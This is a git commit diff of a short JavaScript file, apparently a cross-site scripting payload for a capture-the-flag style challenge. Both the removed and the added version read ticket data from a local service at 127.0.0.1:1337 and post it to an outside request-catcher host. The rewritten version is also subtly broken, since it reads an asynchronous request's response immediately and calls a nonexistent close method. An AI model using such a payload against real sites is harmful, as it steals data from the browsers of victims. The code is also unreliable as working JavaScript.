b0f85912940271a32cae5437f2ae5088f2f3b44d
UnlikeLemon <83449816+UnlikeLemon@users.noreply.github.com>
2021-10-23 10:19:17 -0700

    Update js_script.js

--- js_script.js
+++ js_script.js
@@ -1,11 +1,10 @@
-let response = await fetch("http://127.0.0.1:1337/tickets");
-let json = response.json();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://127.0.0.1:1337/tickets",true);
+xhr.send();
+v = xhr.responseText;
+xhr.close();
 
-let send_data = await fetch("https://lemon.requestcatcher.com/", {
-  method: 'POST',
-  headers: {
-    'Content-Type':'application/json;charset=utf-8'
-  },
-  body: JSON.stringify(json)
-});
-                            
+xhr.open("POST", "https://lemon.requestcatcher.com/", true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+data = v;
+xhr.send(data);
